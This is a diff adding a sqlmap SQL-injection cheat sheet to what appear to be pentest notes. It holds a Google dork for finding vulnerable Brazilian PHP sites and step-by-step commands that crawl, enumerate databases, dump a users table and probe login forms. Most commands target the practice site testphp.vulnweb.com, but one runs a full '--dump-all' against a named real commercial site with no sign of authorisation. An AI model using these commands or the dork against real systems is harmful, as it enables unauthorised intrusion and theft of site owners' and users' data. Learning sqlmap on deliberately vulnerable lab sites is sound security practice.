@@ -1,3 +1,31 @@
+# sqlmap
+
+# parameter finding google dork
+
+    site: .com.br inurl .php id=
+
+# auto crawling command
+
+    sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1
+
+    sqlmap -u "http://www.minasca.com.br/single-produtos.php?id=23" --dump-all --batch --threads 7
+
+# Step by step dumping databases
+
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch --threads 5
+
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads 5
+
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch --threads 5
+
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump --batch --threads 5
+
+## Login page brute-forcing
+
+    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms
+
+    sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=abd&pass=abc&login=submit" --dbs
+
 <h1 align="center">Sub Domain Enumeration</h1>
 
 ### Sub Domain finding using assetfinder+httpx
